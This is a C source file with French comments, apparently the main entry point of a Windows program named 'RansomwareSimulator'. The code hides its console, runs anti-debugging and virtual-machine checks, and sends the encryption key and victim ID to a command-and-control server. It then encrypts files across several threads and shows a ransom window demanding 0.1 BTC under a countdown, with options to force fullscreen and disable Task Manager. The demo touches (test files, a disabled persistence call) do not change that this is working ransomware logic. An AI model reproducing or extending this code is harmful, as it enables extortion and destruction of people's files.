#include "main.h"

// Point d'entrée principal
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Cache la fenêtre console
    HideConsoleWindow();

    // Vérification d'un débogueur
    AntiDebug();

    // Détection de machine virtuelle
    CheckVirtualMachine();

    // Initialiser le mutex pour éviter les instances multiples
    InitializeMutex();

    // Vérifier si c'est la première instance
    if (!g_is_first_run) {
        MessageBoxW(NULL, L"Une autre instance est déjà en cours d'exécution.", L"Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Vérifier si exécuté en tant qu'administrateur
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                               0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin);
        FreeSid(AdministratorsGroup);
    }

    // Initialiser la bibliothèque de cryptographie
    if (sodium_init() < 0) {
        MessageBoxW(NULL, L"Erreur d'initialisation de la lib crypto", L"Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Initialiser le générateur de nombres aléatoires
    srand(time(NULL) ^ GetCurrentProcessId());

    // Initialiser la section critique pour le multi-threading
    InitializeCriticalSection(&g_cs);

    // Générer la clé de chiffrement et l'UUID
    randombytes_buf(g_key, sizeof(g_key));
    generate_uuid(g_uuid);

    // Vérifier les mises à jour
    CheckForUpdate(VERSION);

    // Enregistrer auprès du serveur C&C
    if (!HTTP_POST(g_uuid, g_key, sizeof(g_key))) {
        printf("Attention: Échec enregistrement serveur\n");
    } else {
        printf("Enregistrement serveur réussi\n");
    }

    // Configurer la persistance si administrateur
    if (isAdmin && FALSE) { // Désactivé pour la sécurité
        SET_PERSISTENCE();
    }

    // Créer le répertoire cible s'il n'existe pas
    if (!CreateDirectoryA(TARGET_DIR, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        MessageBoxW(NULL, L"Impossible de créer le répertoire cible", L"Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Créer des fichiers de test pour la démonstration
    CreateTestFiles(TARGET_DIR);

    // Chiffrer les fichiers (multi-thread si possible)
    int files_encrypted = MultiThreadEncrypt(TARGET_DIR, g_key);
    if (files_encrypted == 0) {
        MessageBoxW(NULL, L"Pas de fichiers à chiffrer dans le répertoire", L"Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }
    g_encrypted = 1;

    // Enregistrer la classe de fenêtre
    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"RansomwareSimulator";
    wc.hbrBackground = CreateSolidBrush(RGB(25, 25, 25)); // Fond sombre
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    if (!RegisterClassW(&wc)) {
        MessageBoxW(NULL, L"Échec enregistrement classe fenêtre", L"Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Créer la fenêtre principale
    g_hwnd = CreateWindowW(L"RansomwareSimulator", L"VOS FICHIERS ONT ÉTÉ CHIFFRÉS",
                          WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
                          CW_USEDEFAULT, CW_USEDEFAULT, 650, 450,
                          NULL, NULL, hInstance, NULL);
    if (!g_hwnd) {
        MessageBoxW(NULL, L"Échec création fenêtre", L"Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Créer les éléments de l'interface
    HFONT hTitleFont = CreateFontW(28, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                 ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                 CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Arial");

    g_label = CreateWindowW(L"STATIC", L"VOS FICHIERS ONT ÉTÉ CHIFFRÉS!",
                           WS_VISIBLE | WS_CHILD | SS_CENTER,
                           20, 20, 610, 40, g_hwnd, NULL, hInstance, NULL);
    SendMessageW(g_label, WM_SETFONT, (WPARAM)hTitleFont, TRUE);

    // Conversion de l'UUID en UTF-16
    wchar_t uuid_wide[64];
    MultiByteToWideChar(CP_ACP, 0, g_uuid, -1, uuid_wide, 64);

    wchar_t info_text[512];
    swprintf(info_text, 512,
             L"Vos fichiers ont été chiffrés avec un chiffrement militaire.\n\n"
             L"Pour récupérer vos fichiers, envoyez 0.1 BTC à l'adresse suivante:\n"
             L"%hs\n\n"
             L"Votre ID unique de déchiffrement: %s\n\n"
             L"Après paiement, vos fichiers seront automatiquement déchiffrés.",
             PAYMENT_ADDRESS, uuid_wide);

    g_info = CreateWindowW(L"STATIC", info_text,
                          WS_VISIBLE | WS_CHILD | SS_CENTER,
                          20, 70, 610, 220, g_hwnd, NULL, hInstance, NULL);

    HFONT hInfoFont = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                                ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Arial");
    SendMessageW(g_info, WM_SETFONT, (WPARAM)hInfoFont, TRUE);

    g_timer_label = CreateWindowW(L"STATIC", L"TEMPS RESTANT: INITIALISATION...",
                                WS_VISIBLE | WS_CHILD | SS_CENTER,
                                20, 300, 610, 40, g_hwnd, NULL, hInstance, NULL);

    HFONT hTimerFont = CreateFontW(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                 ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                 CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Arial");
    SendMessageW(g_timer_label, WM_SETFONT, (WPARAM)hTimerFont, TRUE);

    // Bouton pour simuler le paiement (pour les tests)
    HWND hButton = CreateWindowW(L"BUTTON", L"Simuler Paiement (Test)",
                               WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                               225, 350, 200, 30, g_hwnd, (HMENU)1001, hInstance, NULL);
    SendMessageW(hButton, WM_SETFONT, (WPARAM)hInfoFont, TRUE);

    // Définir le compte à rebours (24 heures par défaut)
    g_end_time = time(NULL) + 86400; // 24 heures

    // Pour la démo, utiliser un temps plus court (1 heure)
    if (!isAdmin) g_end_time = time(NULL) + 3600; // 1 heure

    // Activer le mode plein écran si demandé
    if (g_fullscreen) {
        ForceFullScreen(g_hwnd);
    }

    // Désactiver le gestionnaire de tâches si demandé et si admin
    if (g_disable_taskmgr && isAdmin) {
        DisableTaskManager(TRUE);
    }

    // Configurer les timers
    SetTimer(g_hwnd, 1, 1000, NULL); // Timer pour le compte à rebours (chaque seconde)
    SetTimer(g_hwnd, 2, 5000, NULL); // Timer pour vérifier le paiement (toutes les 5 secondes)

    // Afficher la fenêtre
    ShowWindow(g_hwnd, nCmdShow);
    UpdateWindow(g_hwnd);

    // Boucle de messages
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Nettoyer la section critique
    DeleteCriticalSection(&g_cs);

    return 0;
}